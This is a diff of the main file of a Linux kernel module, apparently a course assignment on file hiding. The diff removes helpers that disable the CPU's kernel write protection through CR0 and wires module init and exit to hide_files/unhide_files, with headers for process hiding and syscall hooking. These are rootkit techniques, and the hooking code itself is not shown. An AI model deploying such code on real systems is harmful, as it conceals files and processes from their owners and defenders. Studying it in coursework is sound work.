@@ -1,46 +1,26 @@
-/*  
- *  mod.c - hook stdin
- */
-#ifndef __KERNEL__
-#define __KERNEL__
-#endif
-#ifndef MODULE
-#define MODULE
-#endif
 #include <linux/module.h> /* Needed by all modules */
 #include <linux/kernel.h> /* Needed for KERN_INFO */
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
+
+#include "process_hiding.h"
 #include "file_hiding.h"
+#include "sysmap.h"
+#include "hooking.h"
+
+MODULE_LICENSE("GPL");
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
-#define DRIVER_DESC   "Assigment 4 File Hiding"
-
-
-inline void disable_wp(void){
-	write_cr0(read_cr0() & ~0x00010000);
-}
-
-inline void enable_wp(void){
-	write_cr0(read_cr0() | 0x00010000);
-}
+#define DRIVER_DESC   "Assigment 4 - File Hiding"
 
 static int __init mod_init(void)
 {
-
-  disable_wp(); 
-
-  hide_file();
- 
-  enable_wp();
-  
+  hide_files();
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
-  disable_wp();
-  unhide_file();
-  enable_wp();
+  unhide_files();
 }
 
 
